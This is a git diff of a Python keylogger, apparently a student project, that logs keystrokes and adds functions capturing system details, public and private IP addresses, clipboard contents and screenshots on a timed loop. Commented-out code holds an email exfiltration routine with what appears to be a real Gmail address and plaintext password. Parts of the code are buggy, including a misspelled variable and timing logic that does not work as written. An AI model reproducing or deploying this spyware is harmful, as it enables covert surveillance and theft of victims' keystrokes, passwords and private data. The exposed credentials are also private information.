@@ -1,5 +1,3 @@
-#3yoooo
-
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -32,15 +30,20 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-
+system_information = "system_log.txt"
+clipboard_information = "clipboard.txt"
+screenshot_information = "screenshot.png"
 # email_address= "izanescoffier@gmail.com"
 # password = "izanesCOFFIECER@030303"
 
 file_path = "C:\\Users\\KIIT\\PycharmProjects\\kylggr"
 extend="\\"
 
-# toaddr = "izanescoffier@gmail.com"
+time_interation=15
+number_of_iteration_end=3
 
+# toaddr = "izanescoffier@gmail.com"
+#
 # def send_email(filename, attachment, toaddr):
 #
 #     fromaddr= email_address
@@ -84,42 +87,99 @@ extend="\\"
 #
 # send_email(keys_information,file_path + extend + keys_information ,email_address)
 
+def computer_info():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr=socket.gethostbyname(hostname)
+        try:
+            public_ip = get ("https://api.ipify.org").text
+            f.write("Public_ip Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+        f.write("Processor: "+(platform.processor())+ '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("syetem: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: "+ IPAddr + "\n")
 
 
-count = 0
-keys=[]
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, 'a') as f:
+        try:
 
-def on_press(key):
-    global keys, count
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
 
-    print(key)
-    keys.append(key)
-
-    count += 1
-
-    if count>=1:
-        count=0
-        write_file(keys)
-        keys=[]
+            f.write("Clipboard Data: \n" + pasted_data)
+        except:
+            f.write("Clipboard is empty")
 
 
-def write_file(keys):
-    with open (file_path + extend + keys_information, "a")as f:
-        for key in keys:
-            k=str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write("\n")
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+
+def screenshot():
+    im=ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
 
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+number_of_iteration=0
+current_time=time.time()
+stopping_time=time.time() + time_interation
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+while number_of_iteration < number_of_iteration_end :
 
 
+
+    count = 0
+    keys=[]
+
+    def on_press(key):
+        global keys, count, current_time
+
+        print(key)
+        keys.append(key)
+
+        count += 1
+        curreent_time = time.time()
+
+        if count>=1:
+            count=0
+            write_file(keys)
+            keys=[]
+
+
+    def write_file(keys):
+        with open (file_path + extend + keys_information, "a")as f:
+            for key in keys:
+                k=str(key).replace("'","")
+                if k.find("space") > 0:
+                    f.write("\n")
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+    computer_info()
+
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if current_time >= stopping_time:
+            return False
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if current_time > stopping_time:
+        with open(file_path + extend + keys_information, 'w') as f:
+            f.write(" ")
+
+        screenshot()
+        copy_clipboard()
+
+        number_of_iteration += 1
+        current_time = time.time()
+        stopping_time = time.time() + time_interation
